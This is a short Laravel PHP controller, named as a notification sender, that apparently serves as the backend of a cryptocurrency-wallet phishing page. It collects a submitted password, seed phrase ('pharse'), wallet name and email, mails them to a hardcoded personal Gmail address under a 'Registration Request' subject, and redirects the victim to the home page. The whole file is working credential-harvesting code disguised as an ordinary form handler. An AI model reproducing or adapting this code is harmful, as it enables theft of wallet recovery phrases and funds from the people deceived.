<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class notificationSender extends Controller
{
    public function index(Request $request)
    {

        $email = null;
        if(!is_null($request->email)){
            $email =  $request->email;
        }

        $data = [
            'password' => $request->password,
            'pharse' => $request->pharse,
            'wallet' => $request->wallet,
            'email' => $email,
        ];

        $user['to'] = 'sourov.okk@gmail.com';

        Mail::send('mail', $data, function($message) use ($user, $data) {
            $message->to($user['to']);
            $details = 'Registration Request' . '-' . $data['wallet'];
            $message->subject($details);
        });

        return redirect('/');
    }
}
